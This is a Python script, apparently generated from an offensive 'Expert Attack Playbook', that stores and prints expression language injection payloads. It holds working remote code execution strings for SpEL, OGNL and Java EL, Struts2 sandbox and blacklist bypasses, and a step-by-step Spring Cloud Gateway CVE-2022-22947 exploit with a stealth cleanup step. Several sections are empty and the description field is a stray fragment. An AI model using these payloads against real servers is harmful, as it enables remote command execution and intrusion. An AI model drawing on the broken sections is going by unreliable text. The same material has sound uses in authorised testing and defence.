#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/expression-language-injection

Skill: SKILL: Expression Language Injection — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-expression-language-injection.py --help
      python hack-skills-expression-language-injection.py --list
      python hack-skills-expression-language-injection.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/expression-language-injection'
TITLE = 'SKILL: Expression Language Injection — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: expression-language-injection", "description: >-", "Expression Language injection playbook. Use when Java EL, SpEL, OGNL, or MVEL expressions may evaluate attacker-controlled input in Spring, Struts2, Confluence, or similar frameworks."],
    'skill-expression-language-injection-expert-attack-playbook': [],
    '0-related-routing': ["- [ssti-server-side-template-injection](../ssti-server-side-template-injection/SKILL.md) for template engines (Jinja2, FreeMarker, Twig) \u2014 different attack surface", "- [jndi-injection](../jndi-injection/SKILL.md) when EL evaluation leads to JNDI lookup", "**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation."],
    '1-detection-polyglot-probes': ["```text", "${7*7}              \u2192 49 = SpEL, OGNL, or Java EL", "%{7*7}              \u2192 49 = OGNL (Struts2)", "${T(java.lang.Math).random()}  \u2192 random float = SpEL confirmed", "%{#context}         \u2192 object dump = OGNL confirmed"],
    'disambiguation': [],
    '2-spel-spring-expression-language': [],
    'where-spel-appears': ["- `@Value(\"${...}\")` annotations", "- Spring Security expressions (`@PreAuthorize`)", "- Spring Cloud Gateway route predicates and filters", "- Thymeleaf `th:text=\"${...}\"` (when combined with `__${...}__` preprocessing)", "- Spring Data `@Query` with SpEL"],
    'rce-via-runtime-exec': ["```java", "${T(java.lang.Runtime).getRuntime().exec(\"id\")}"],
    'rce-with-output-capture-commons-io': ["```java", "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream())}"],
    'rce-with-output-capture-spring-streamutils': ["```java"],
    'processbuilder-alternative-when-runtime-is-blocked': ["```java", "${new java.lang.ProcessBuilder(new String[]{\"id\"}).start()}"],
    'spring-cloud-gateway-cve-2022-22947': ["Exploit via actuator to add malicious route with SpEL filter:", "```bash"],
    'step-1-add-route-with-spel-in-filter-with-output-capture': ["POST /actuator/gateway/routes/hacktest", "Content-Type: application/json", "\"id\": \"hacktest\",", "\"filters\": [{", "\"name\": \"AddResponseHeader\",", "\"args\": {", "\"name\": \"Result\",", "\"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}\"", "\"uri\": \"http://example.com\",", "\"predicates\": [{\"name\": \"Path\", \"args\": {\"_genkey_0\": \"/hackpath\"}}]"],
    'step-2-refresh-routes-to-apply': ["POST /actuator/gateway/refresh"],
    'step-3-trigger-the-route': ["GET /hackpath"],
    'response-header-result-contains-command-output': [],
    'step-4-clean-up-important-for-stealth': ["DELETE /actuator/gateway/routes/hacktest", "POST /actuator/gateway/refresh"],
    'spel-sandbox-bypass': ["When `SimpleEvaluationContext` is used (restricts `T()` operator):", "```java", "// Try reflection-based bypass:", "${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}"],
    '3-ognl-object-graph-navigation-language': [],
    'where-ognl-appears': ["- Apache Struts2 \u2014 primary OGNL consumer", "- Confluence Server \u2014 uses OGNL in certain request paths", "- Any Java app using `ognl.Ognl.getValue()` or `ognl.Ognl.setValue()`"],
    'basic-rce': ["%{(#cmd='id').(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec(#cmd))}"],
    'struts2-sandbox-bypass-memberaccess-manipulation': ["Struts2 restricts OGNL via `SecurityMemberAccess`. Classic bypass clears restrictions:", "%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"],
    'struts2-ognlutil-blacklist-clear': ["Later Struts2 versions use class/package blacklists. Bypass by clearing `excludedClasses` and `excludedPackageNames`:", "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.excludedClasses.clear()).(#ognlUtil.excludedPackageNames.clear()).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(#cmd='id').(#rt=@java.lang.Runtime@getRuntime().exec(#cmd))}"],
    'key-struts2-cves': [],
    'confluence-ognl-cve-2021-26084': ["Confluence Server allows OGNL injection via the `queryString` or action parameters:", "```bash", "POST /pages/createpage-entervariables.action", "Content-Type: application/x-www-form-urlencoded", "queryString=%5cu0027%2b%7b3*3%7d%2b%5cu0027"],
    'url-decoded-u0027-3-3-u0027': [],
    'if-response-contains-9-confirmed': [],
    'escalate-to-runtime-exec-for-rce': [],
    '4-java-el-jsp-jsf': [],
    'where-java-el-appears': ["- JSP pages: `${expression}` and `#{expression}`", "- JSF (JavaServer Faces): value and method bindings", "- Custom tag libraries"],
    'rce-payloads': ["```java", "// Java EL with Runtime:", "${Runtime.getRuntime().exec(\"id\")}", "// Via pageContext (JSP):", "${pageContext.request.getServletContext().getClassLoader()}", "// Reflection-based:", "${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}"],
    '5-detection-methodology': ["Input reflected and ${7*7} returns 49?", "\u251c\u2500\u2500 Java application?", "\u2502   \u251c\u2500\u2500 Struts2? \u2192 Try %{...} OGNL payloads", "\u2502   \u2502   \u2514\u2500\u2500 Check Content-Type injection (S2-045)", "\u2502   \u251c\u2500\u2500 Spring? \u2192 Try T(java.lang.Runtime) SpEL", "\u2502   \u2502   \u2514\u2500\u2500 Check /actuator/gateway (Spring Cloud Gateway)", "\u2502   \u251c\u2500\u2500 Confluence? \u2192 Try OGNL via action parameters", "\u2502   \u2514\u2500\u2500 JSP/JSF? \u2192 Try Java EL payloads", "\u251c\u2500\u2500 Error messages reveal framework?", "\u2502   \u251c\u2500\u2500 \"ognl.OgnlException\" \u2192 OGNL", "\u2502   \u251c\u2500\u2500 \"SpelEvaluationException\" \u2192 SpEL", "\u2502   \u2514\u2500\u2500 \"javax.el.ELException\" \u2192 Java EL", "\u2514\u2500\u2500 Blocked by sandbox?", "\u251c\u2500\u2500 OGNL: clear _memberAccess / excludedClasses", "\u251c\u2500\u2500 SpEL: reflection bypass for SimpleEvaluationContext", "\u2514\u2500\u2500 Try alternative exec methods (ProcessBuilder, ScriptEngine)"],
    '6-quick-reference': ["```text"],
    'spel-rce': ["${T(java.lang.Runtime).getRuntime().exec(\"id\")}"],
    'ognl-rce-struts2': ["%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}"],
    'ognl-with-sandbox-bypass': ["%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec('id'))}"],
    'java-el-rce': ["${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")}"],
    'confluence-cve-2021-26084-probe': ["queryString=\\u0027%2b{3*3}%2b\\u0027"],
    'spring-cloud-gateway-cve-2022-22947': ["POST /actuator/gateway/routes/x  \u2192 SpEL in filter args", "POST /actuator/gateway/refresh"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()